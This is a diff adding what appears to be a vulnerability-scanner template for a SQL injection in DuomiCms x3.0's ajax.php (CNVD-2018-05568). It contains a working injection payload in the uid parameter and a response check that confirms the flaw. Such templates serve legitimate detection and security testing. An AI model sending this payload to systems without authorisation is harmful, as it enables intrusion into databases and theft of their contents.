@@ -1,0 +1,17 @@
+name: DuomiCms_SQLi__CNVD_2018_05568
+transport: http
+set: {}
+detail:
+  dock: app="DuomiCms"
+  product: DuomiCms
+  homepage: http://www.duomicms.net/
+  impact: ''
+  description: DuomiCms x3.0 front end duomiphp/ajax.php file has SQL injection vulnerability.
+    Attackers can use vulnerabilities to obtain sensitive information in the database.
+rules:
+  r1:
+    method: GET
+    path: /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(852963)))
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b'be8a28444fe9b80595f92b8493fc4')
+expression: r1()
